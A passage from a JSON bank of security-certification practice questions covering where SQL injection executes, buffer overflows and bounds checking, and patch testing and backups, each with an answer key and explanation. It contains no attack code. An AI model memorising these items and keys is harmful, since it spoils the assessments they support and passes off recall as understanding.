          "id": "z_browser",
          "label": "User's browser",
          "x": 2,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_web",
          "label": "Web server",
          "x": 26.5,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_app",
          "label": "Application server",
          "x": 51,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_db",
          "label": "Database server",
          "x": 75.5,
          "y": 30,
          "w": 22.5,
          "h": 40
        }
      ],
      "answer": [
        "z_db"
      ],
      "explanation": "The application passes the unvalidated input into a query, and the injected SQL runs on the database server, which is why SQLi can read, change or delete data directly. By contrast, an XSS payload executes in the user's browser."
    },
    {
      "id": "d2-2.3-20",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A developer's form writes user input into an 8-byte variable. Entering 9 characters changes the value of the next variable in memory, which holds the user's privilege level. Which of the following secure coding practices would have prevented this?",
      "options": [
        "Output encoding",
        "Parameterized queries",
        "Code signing",
        "Bounds checking on input length"
      ],
      "answer": [
        3
      ],
      "explanation": "This is a buffer overflow caused by writing past the end of a buffer. Checking that input fits the allocated size prevents it. Parameterized queries stop SQL injection, output encoding stops XSS, and code signing proves who published code."
    },
    {
      "id": "d2-2.3-21",
      "domain": "2.3",
      "type": "multiple",
      "difficulty": "medium",
      "question": "A company with 4,000 Windows servers receives the monthly Patch Tuesday release, which includes several critical remote code execution fixes. Which of the following should the company do BEFORE deploying the patches to production? (Select TWO)",
      "options": [
        "Deploy only after attackers publish exploit code",
        "Disable automatic updates permanently",
        "Confirm known-good backups exist so changes can be rolled back",
        "Wait until the operating system reaches end of service life",
        "Test the patches in a non-production environment"
      ],
      "answer": [
        2,
        4
      ],
      "explanation": "Large environments test patches before production and keep a backup or rollback path in case a patch breaks something. Patch quickly, though: once a fix is published attackers reverse-engineer it, so waiting for exploit code or for EOSL increases risk."
    }
  ]
};
